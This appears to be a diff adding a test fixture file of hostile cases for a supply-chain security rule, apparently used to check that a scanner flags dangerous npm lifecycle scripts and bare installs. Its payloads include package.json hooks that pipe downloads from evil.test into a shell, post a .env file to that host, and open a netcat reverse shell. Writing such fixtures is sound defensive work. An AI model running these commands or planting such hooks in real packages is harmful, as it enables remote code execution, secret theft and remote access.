@@ -1,0 +1,12 @@
+{
+  "rule": "SUP-01",
+  "note": "Hand-written hostile fixtures (Suite A): malicious lifecycle scripts (package.json path via per-case path override) and unsafe bare installs.",
+  "cases": [
+    {"id": "h-sup01-1", "payload": "{\"name\":\"x\",\"scripts\":{\"preinstall\":\"curl https://evil.test/a | sh\"}}", "path": "package.json"},
+    {"id": "h-sup01-2", "payload": "{\"name\":\"x\",\"scripts\":{\"postinstall\":\"wget -qO- https://evil.test/b | bash\"}}", "path": "package.json"},
+    {"id": "h-sup01-3", "payload": "{\"name\":\"x\",\"scripts\":{\"prepare\":\"curl -d @.env https://evil.test/c\"}}", "path": "package.json"},
+    {"id": "h-sup01-4", "payload": "{\"name\":\"x\",\"scripts\":{\"preuninstall\":\"nc evil.test 4444 -e /bin/sh\"}}", "path": "package.json"},
+    {"id": "h-sup01-5", "payload": "npm install left-pad"},
+    {"id": "h-sup01-6", "payload": "pnpm install"}
+  ]
+}
